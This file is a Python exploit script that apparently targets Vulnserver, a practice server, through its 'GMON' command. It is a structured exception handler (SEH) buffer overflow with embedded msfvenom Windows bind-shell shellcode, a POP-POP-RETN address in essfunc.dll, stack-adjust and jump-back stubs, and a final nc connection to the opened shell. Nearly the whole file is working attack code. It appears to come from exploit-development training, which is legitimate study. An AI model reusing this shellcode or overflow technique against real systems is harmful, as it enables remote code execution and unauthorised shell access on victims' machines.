#!/usr/bin/env python

import socket
import sys
import time
import os
from struct import pack

def sendPayload(host, port, payload):
	try:
		# Sending connection
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,port))
		s.send('')
		data = s.recv(4096)
		print(data)
		s.send('{0}\r\n'.format(payload))
		s.close()
	except:
		print "final length: {length}".format(length = len(payload))
		sys.exit-1()

def main():
	# msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f python -v bindShell -b '\x00' LPORT=8443
	# Payload size: 355 bytes
	# Final size of python file: 1916 bytes
	bindShell =  ""
	bindShell += "\xb8\xae\x93\xbe\xa7\xda\xc8\xd9\x74\x24\xf4\x5b"
	bindShell += "\x31\xc9\xb1\x53\x83\xc3\x04\x31\x43\x0e\x03\xed"
	bindShell += "\x9d\x5c\x52\x0d\x49\x22\x9d\xed\x8a\x43\x17\x08"
	bindShell += "\xbb\x43\x43\x59\xec\x73\x07\x0f\x01\xff\x45\xbb"
	bindShell += "\x92\x8d\x41\xcc\x13\x3b\xb4\xe3\xa4\x10\x84\x62"
	bindShell += "\x27\x6b\xd9\x44\x16\xa4\x2c\x85\x5f\xd9\xdd\xd7"
	bindShell += "\x08\x95\x70\xc7\x3d\xe3\x48\x6c\x0d\xe5\xc8\x91"
	bindShell += "\xc6\x04\xf8\x04\x5c\x5f\xda\xa7\xb1\xeb\x53\xbf"
	bindShell += "\xd6\xd6\x2a\x34\x2c\xac\xac\x9c\x7c\x4d\x02\xe1"
	bindShell += "\xb0\xbc\x5a\x26\x76\x5f\x29\x5e\x84\xe2\x2a\xa5"
	bindShell += "\xf6\x38\xbe\x3d\x50\xca\x18\x99\x60\x1f\xfe\x6a"
	bindShell += "\x6e\xd4\x74\x34\x73\xeb\x59\x4f\x8f\x60\x5c\x9f"
	bindShell += "\x19\x32\x7b\x3b\x41\xe0\xe2\x1a\x2f\x47\x1a\x7c"
	bindShell += "\x90\x38\xbe\xf7\x3d\x2c\xb3\x5a\x2a\x81\xfe\x64"
	bindShell += "\xaa\x8d\x89\x17\x98\x12\x22\xbf\x90\xdb\xec\x38"
	bindShell += "\xd6\xf1\x49\xd6\x29\xfa\xa9\xff\xed\xae\xf9\x97"
	bindShell += "\xc4\xce\x91\x67\xe8\x1a\x0f\x6f\x4f\xf5\x32\x92"
	bindShell += "\x2f\xa5\xf2\x3c\xd8\xaf\xfc\x63\xf8\xcf\xd6\x0c"
	bindShell += "\x91\x2d\xd9\x12\x99\xbb\x3f\x38\x4d\xea\xe8\xd4"
	bindShell += "\xaf\xc9\x20\x43\xcf\x3b\x19\xe3\x98\x2d\x9e\x0c"
	bindShell += "\x19\x78\x88\x9a\x92\x6f\x0c\xbb\xa4\xa5\x24\xac"
	bindShell += "\x33\x33\xa5\x9f\xa2\x44\xec\x77\x46\xd6\x6b\x87"
	bindShell += "\x01\xcb\x23\xd0\x46\x3d\x3a\xb4\x7a\x64\x94\xaa"
	bindShell += "\x86\xf0\xdf\x6e\x5d\xc1\xde\x6f\x10\x7d\xc5\x7f"
	bindShell += "\xec\x7e\x41\x2b\xa0\x28\x1f\x85\x06\x83\xd1\x7f"
	bindShell += "\xd1\x78\xb8\x17\xa4\xb2\x7b\x61\xa9\x9e\x0d\x8d"
	bindShell += "\x18\x77\x48\xb2\x95\x1f\x5c\xcb\xcb\xbf\xa3\x06"
	bindShell += "\x48\xcf\xe9\x0a\xf9\x58\xb4\xdf\xbb\x04\x47\x0a"
	bindShell += "\xff\x30\xc4\xbe\x80\xc6\xd4\xcb\x85\x83\x52\x20"
	bindShell += "\xf4\x9c\x36\x46\xab\x9d\x12"

	# Add 0x320 to ESP
	adjESP = "\x31\xC0\x2D\x01\x26\x03\x2A\x2D\x05\x5A\x34\x5E\x2D\x26\x78\xC8\x77\x29\xC4"

	# Jump back 512 bytes
	jmpBack = "\x90\x90\x90\x90\x90\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1"

	# Target Host
	host = '127.0.0.1'
	port = 9999

	# Bind Port
	bport = 8443

	# POP-POP-RETN in essfunc.dll
	sehValue = pack('<i', 0x625010B4)

	# jump over SEH
	sehJump = "\x77\x06"

	# NOP Padding
	nopPad = "\x41\x41\x41\x41"

	# front padding/payload
	front = '\x90' * (3519 - len(sehJump) - len(bindShell) - len(nopPad)) + bindShell + nopPad + sehJump

	# tail padding/payload
	tail = jmpBack + 'B' * (5050 - len(front) - len(sehValue) - len(jmpBack))

	payload = 'GMON /.:/' + front + sehValue + tail

	print('Total payload length: {0}'.format(len(payload)))
	print('Front padding length: {0}'.format(len(front)))
	print('Tail padding length: {0}'.format((5050 - len(sehValue) - len(tail))))

	print('\r\n\r\n[+] Sending payload')
	sendPayload(host, port, payload)
	print('[+] Connecting to shell')
	time.sleep(1)
	os.system('nc {0} {1}'.format(host, bport))
	print('[+] Connection closed.')

if __name__ == "__main__":
	sys.exit(main())
